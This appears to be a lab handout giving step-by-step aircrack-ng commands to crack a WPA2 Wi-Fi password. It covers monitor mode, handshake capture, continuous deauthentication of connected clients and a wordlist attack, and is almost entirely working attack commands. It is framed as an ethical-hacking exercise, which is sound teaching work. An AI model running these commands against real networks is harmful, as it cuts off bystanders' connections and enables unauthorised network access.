 Perform Wi-Fi password cracking of WPA-2 Security enabled 

Step 1: Check Available Wireless Adapter 
● Use the following command to check for available wireless adapters: 
iwconfig 
Step 2: Put Down the Wireless Adapter 
● To prepare the adapter for monitor mode, put it down: 
ifconfig wlan0 down 
Step 3: Kill Conflicting Processes 
● Ensure that no conflicting processes are running: 
airmon-ng check kill 
Step 4: Change Adapter Mode to Monitor 
● Change the mode of your wireless adapter to monitor mode: 
iwconfig wlan0 mode monitor 
Step 5: Verify Mode Change 
● Verify that the mode of your wireless adapter has been changed to monitor: 
iwconfig 
Step 6: Enable the Interface 
● Finally, bring the interface back up: 
ifconfig wlan0 up 
Note: Monitor mode allows you to capture network traffic, making it a crucial step 
for ethical hacking tasks. 
Step 1: Scan for Available Networks 
● Use airodump-ng to scan for available networks: 
airodump-ng --band abg wlan0 
Step 2: Select the Target Network and Capture the WPA Handshake 
● Use airodump-ng to capture the WPA handshake for the selected network. 
Replace <mac> with the BSSID (MAC address) of the target network and 
<channel> with the channel number: 
airodump-ng --bssid <mac> --channel <channel> --write lab2 wlan0 
Step 4: Deauthenticate Users 
● Deauthenticate users on the target network to force a WPA handshake 
capture: 
aireplay-ng --deauth 0 -a <mac> wlan0 
Step 5: Crack the WPA Password 
● Use aircrack-ng to attempt to crack the captured WPA handshake using a 
wordlist (replace <wordlist> with the path to your wordlist file): 
aircrack-ng lab2-01.cap -w <wordlist> 
Note: The wordlist should contain potential passwords to try for cracking the WPA 
key. 
This documentation outlines the steps involved in capturing a WPA handshake and 
attempting to crack the password. Make sure to replace <mac>, <channel>, and 
<wordlist> with the actual values you used during your task.
